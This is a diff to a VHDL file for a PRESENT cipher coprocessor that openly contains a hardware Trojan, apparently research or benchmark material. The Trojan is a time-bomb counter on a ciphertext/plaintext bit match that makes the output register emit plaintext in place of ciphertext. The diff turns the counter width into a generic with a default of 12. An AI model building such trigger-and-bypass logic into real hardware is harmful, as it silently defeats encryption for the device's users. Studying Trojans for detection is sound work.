@@ -2,13 +2,16 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 8: trigger = Timebomb which triggers after each (2^k)-1 events of 
+-- Trojan 8: trigger = Timebomb which triggers after each 2^k events of 
 -- ciphertext(43 downto 40) = data_in(59 downto 56), i.e. when 4 specific bits of the
 -- computed ciphertext are equal to 4 specific bits of the input data AND the current operation is 
 -- an encryption
 -- payload = ovewrite computer ciphertext with input data (plaintext)
 
 entity present_Trojan8 is
+        generic (
+                TROJAN_COUNTER_WIDTH : natural := 12
+        );
         port (
                 clk      : in std_logic;
                 rst      : in std_logic;
@@ -47,8 +50,6 @@ architecture rtl of present_Trojan8 is
         signal  trojan_trig,
                 trojan_counter_rst,
                 trojan_counter_event : std_logic;
-
-        constant TROJAN_COUNTER_WIDTH : natural := 2; -- final trojan counter width value ?
 
         signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH-1 downto 0);
         signal  trojan_mux_out : std_logic_vector(63 downto 0);
@@ -139,7 +140,7 @@ begin
                 );
         
         -- the Trojan triggers when its counter reaches its max value
-        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
+       trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';                
 
         -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
         -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
@@ -167,7 +168,7 @@ begin
                         input_B => data_in,                        
                         sel => trojan_trig,
                         mux_out => trojan_mux_out
-                );
+                );        
 
         -- Coprocessor-global output register, in order to preserve the computed output data,
         -- until new ones are available. This can be helpful when a device reading from
